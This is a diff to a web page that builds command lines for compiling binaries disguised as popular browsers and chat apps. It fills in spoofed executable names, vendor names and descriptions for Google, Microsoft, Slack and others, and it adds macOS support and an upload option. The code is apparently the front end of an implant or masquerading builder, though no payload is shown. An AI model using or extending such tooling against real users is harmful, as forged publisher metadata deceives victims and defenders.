@@ -246,10 +246,23 @@ input[type=file].upload-input::file-selector-button{background:var(--surface);co
             <input type="text" id="f-bin" placeholder="google-chrome">
           </div>
         </div>
+        <div id="mac-fields" class="fields" style="display:none">
+          <div class="field field-med">
+            <label>Binary Name</label>
+            <input type="text" id="f-mac-bin" placeholder="google-chrome">
+          </div>
+        </div>
 
-        <div class="os-tabs">
-          <button class="os-tab active" id="tab-win" onclick="setOS('win')">Windows</button>
-          <button class="os-tab" id="tab-linux" onclick="setOS('linux')">Linux</button>
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+          <div class="os-tabs" style="margin-bottom:0">
+            <button class="os-tab active" id="tab-win" onclick="setOS('win')">Windows</button>
+            <button class="os-tab" id="tab-mac" onclick="setOS('mac')">macOS</button>
+            <button class="os-tab" id="tab-linux" onclick="setOS('linux')">Linux</button>
+          </div>
+          <label style="display:flex;align-items:center;gap:7px;font-size:12px;color:var(--dim);cursor:pointer;user-select:none">
+            <input type="checkbox" id="f-upload" onchange="updateCommand()" style="accent-color:var(--accent)">
+            Upload after build
+          </label>
         </div>
         <div class="cmd-wrap">
           <div class="cmd-bar">
@@ -304,19 +317,19 @@ const ICONS = {
 
 const PRESETS = {
   browsers:[
-    {id:'chrome',  name:'Chrome',   company:'Google LLC',               desc:'Google Chrome',          winExe:'chrome',   linuxBin:'google-chrome'},
-    {id:'edge',    name:'Edge',     company:'Microsoft Corporation',    desc:'Microsoft Edge',          winExe:'edge',     linuxBin:'microsoft-edge'},
-    {id:'brave',   name:'Brave',    company:'Brave Software, Inc',      desc:'Brave Browser',           winExe:'brave',    linuxBin:'brave-browser'},
-    {id:'firefox', name:'Firefox',  company:'Mozilla Corporation',      desc:'Mozilla Firefox',         winExe:'firefox',  linuxBin:'firefox'},
-    {id:'opera',   name:'Opera',    company:'Opera Software AS',        desc:'Opera internet browser',  winExe:'opera',    linuxBin:'opera'},
+    {id:'chrome',  name:'Chrome',   company:'Google LLC',               desc:'Google Chrome',          winExe:'chrome',   macBin:'google-chrome',   linuxBin:'google-chrome'},
+    {id:'edge',    name:'Edge',     company:'Microsoft Corporation',    desc:'Microsoft Edge',          winExe:'edge',     macBin:'microsoft-edge',  linuxBin:'microsoft-edge'},
+    {id:'brave',   name:'Brave',    company:'Brave Software, Inc',      desc:'Brave Browser',           winExe:'brave',    macBin:'brave-browser',   linuxBin:'brave-browser'},
+    {id:'firefox', name:'Firefox',  company:'Mozilla Corporation',      desc:'Mozilla Firefox',         winExe:'firefox',  macBin:'firefox',         linuxBin:'firefox'},
+    {id:'opera',   name:'Opera',    company:'Opera Software AS',        desc:'Opera internet browser',  winExe:'opera',    macBin:'opera',           linuxBin:'opera'},
   ],
   chat:[
-    {id:'slack',    name:'Slack',    company:'Slack Technologies, Inc.', desc:'Slack',            winExe:'slack',    linuxBin:'slack'},
-    {id:'discord',  name:'Discord',  company:'Discord Inc.',             desc:'Discord',          winExe:'discord',  linuxBin:'discord'},
-    {id:'teams',    name:'Teams',    company:'Microsoft Corporation',    desc:'Microsoft Teams',  winExe:'ms-teams', linuxBin:'teams'},
-    {id:'zoom',     name:'Zoom',     company:'Zoom Video Communications, Inc.', desc:'Zoom',     winExe:'zoom',     linuxBin:'zoom'},
-    {id:'whatsapp', name:'WhatsApp', company:'WhatsApp LLC',             desc:'WhatsApp',         winExe:'whatsapp', linuxBin:'whatsapp'},
-    {id:'telegram', name:'Telegram', company:'Telegram FZ-LLC',          desc:'Telegram Desktop', winExe:'telegram', linuxBin:'telegram'},
+    {id:'slack',    name:'Slack',    company:'Slack Technologies, Inc.', desc:'Slack',            winExe:'slack',    macBin:'slack',            linuxBin:'slack'},
+    {id:'discord',  name:'Discord',  company:'Discord Inc.',             desc:'Discord',          winExe:'discord',  macBin:'discord',          linuxBin:'discord'},
+    {id:'teams',    name:'Teams',    company:'Microsoft Corporation',    desc:'Microsoft Teams',  winExe:'ms-teams', macBin:'teams',            linuxBin:'teams'},
+    {id:'zoom',     name:'Zoom',     company:'Zoom Video Communications, Inc.', desc:'Zoom',     winExe:'zoom',     macBin:'zoom',             linuxBin:'zoom'},
+    {id:'whatsapp', name:'WhatsApp', company:'WhatsApp LLC',             desc:'WhatsApp',         winExe:'whatsapp', macBin:'whatsapp-desktop', linuxBin:'whatsapp-desktop'},
+    {id:'telegram', name:'Telegram', company:'Telegram FZ-LLC',          desc:'Telegram Desktop', winExe:'telegram', macBin:'telegram-desktop', linuxBin:'telegram-desktop'},
   ],
 };
 
@@ -341,19 +354,22 @@ function buildCard(p) {
 function selectPreset(p) {
   document.querySelectorAll('.preset-card').forEach(c => c.classList.toggle('selected', c.dataset.id === p.id));
   selectedPreset = p;
-  document.getElementById('f-exe').value  = p.winExe;
-  document.getElementById('f-co').value   = p.company;
-  document.getElementById('f-desc').value = p.desc;
-  document.getElementById('f-bin').value  = p.linuxBin;
+  document.getElementById('f-exe').value     = p.winExe;
+  document.getElementById('f-co').value      = p.company;
+  document.getElementById('f-desc').value    = p.desc;
+  document.getElementById('f-bin').value     = p.linuxBin;
+  document.getElementById('f-mac-bin').value = p.macBin;
   document.getElementById('config-panel').classList.add('visible');
   updateCommand();
 }
 
 function setOS(os) {
   currentOS = os;
-  document.getElementById('tab-win').classList.toggle('active', os === 'win');
+  document.getElementById('tab-win').classList.toggle('active',   os === 'win');
+  document.getElementById('tab-mac').classList.toggle('active',   os === 'mac');
   document.getElementById('tab-linux').classList.toggle('active', os === 'linux');
   document.getElementById('win-fields').style.display   = os === 'win'   ? '' : 'none';
+  document.getElementById('mac-fields').style.display   = os === 'mac'   ? '' : 'none';
   document.getElementById('linux-fields').style.display = os === 'linux' ? '' : 'none';
   document.getElementById('cmd-label').textContent =
     os === 'win' ? 'PowerShell — run from repo root' : 'Bash — run from repo root (requires sudo)';
@@ -370,6 +386,7 @@ function shflag(name, val) {
 function updateCommand() {
   if (!selectedPreset) return;
   const p = selectedPreset;
+  const upload = document.getElementById('f-upload').checked;
 
   if (currentOS === 'win') {
     const exe  = document.getElementById('f-exe').value.trim();
@@ -379,11 +396,19 @@ function updateCommand() {
     if (exe  && exe  !== p.winExe)   parts.push(flag('-ExeName',  exe));
     if (co   && co   !== p.company)  parts.push(flag('-Company',  `"${co}"`));
     if (desc && desc !== p.desc)     parts.push(flag('-FileDesc', `"${desc}"`));
+    if (upload) parts.push(`<span class="ps-flag">-Upload</span>`);
+    document.getElementById('cmd-output').innerHTML = parts.join(' ');
+  } else if (currentOS === 'mac') {
+    const bin = document.getElementById('f-mac-bin').value.trim();
+    let parts = ['./build_mac.sh', shflag('--preset', p.id)];
+    if (bin && bin !== p.macBin) parts.push(shflag('--name', bin));
+    if (upload) parts.push(`<span class="sh-flag">--upload</span>`);
     document.getElementById('cmd-output').innerHTML = parts.join(' ');
   } else {
     const bin = document.getElementById('f-bin').value.trim();
     let parts = ['sudo ./build_linux.sh', shflag('--preset', p.id)];
     if (bin && bin !== p.linuxBin) parts.push(shflag('--name', bin));
+    if (upload) parts.push(`<span class="sh-flag">--upload</span>`);
     document.getElementById('cmd-output').innerHTML = parts.join(' ');
   }
 }
@@ -441,10 +466,9 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('chat-grid').append(...PRESETS.chat.map(buildCard));
   injectIcons();
 
-  ['f-exe','f-co','f-desc'].forEach(id =>
+  ['f-exe','f-co','f-desc','f-bin','f-mac-bin'].forEach(id =>
     document.getElementById(id).addEventListener('input', updateCommand)
   );
-  document.getElementById('f-bin').addEventListener('input', updateCommand);
 });
 </script>
 </body>
